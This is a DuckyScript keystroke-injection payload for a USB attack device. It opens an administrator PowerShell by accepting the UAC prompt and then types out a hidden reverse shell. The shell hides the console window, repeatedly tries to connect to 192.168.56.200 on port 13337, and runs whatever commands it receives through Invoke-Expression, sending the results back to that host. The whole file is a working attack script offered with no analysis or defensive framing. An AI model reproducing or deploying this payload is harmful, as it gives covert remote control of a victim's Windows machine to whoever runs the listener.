DELAY 3000
CONTROL ESCAPE
STRING_DELAY 10
DELAY 1000
STRING powershell
STRING_DELAY 10
DELAY 500
CTRL-SHIFT ENTER
STRING_DELAY 10
DELAY 2000
ALT Y
STRING_DELAY 10
DELAY 5000

STRING Add-Type @"
SPACE
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING using System;
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING using System.Runtime.InteropServices;
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING public class ConsoleWindow {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING [DllImport("kernel32.dll")]
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING public static extern IntPtr GetConsoleWindow();
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING [DllImport(" user32.dll")]
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING public static void Hide() {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING var handle = GetConsoleWindow();
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING ShowWindow(handle, 0); // 0 = SW_HIDE
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING "@
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING $runspace = [runspacefactory]::CreateRunspace()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $runspace.Open()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING do {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING try {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.200', 13337)
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING if ($TCPClient.Connected) {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING Write-Host "Connected to TCP server."
SPACE
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING } else {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING throw " Unable to connect to server on 192.168.56.200:13337"
SPACE
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING } catch {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING Write-Host "Failed to connect: $($_.Exception.Message)"
SPACE
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING Start-Sleep -Seconds 1
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING } while (-not $TCPClient.Connected)
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING $NetworkStream = $TCPClient.GetStream()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $StreamWriter.AutoFlush = $true
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $StreamReader = New-Object IO.StreamReader($NetworkStream)
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING $StreamWriter.WriteLine('SHELL> ')
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING [ConsoleWindow]::Hide()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 1000

STRING while ($true) {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $Command = $StreamReader.ReadLine()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING if ($Command -eq ' exit') {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING break
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING try {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $Result = Invoke-Expression $Command 2>&1 | Out-String
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $Output = $Result + "`n"
SPACE
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $StreamWriter.WriteLine($Output)
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING } catch {
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $StreamWriter.WriteLine(" Error: " + $_.Exception.Message)
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING }
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING $StreamWriter.Close()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $StreamReader.Close()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $NetworkStream.Close()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $TCPClient.Close()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100
STRING $runspace.Close()
STRING_DELAY 10
ENTER
STRING_DELAY 10
DELAY 100

STRING exit
STRING_DELAY 10
ENTER
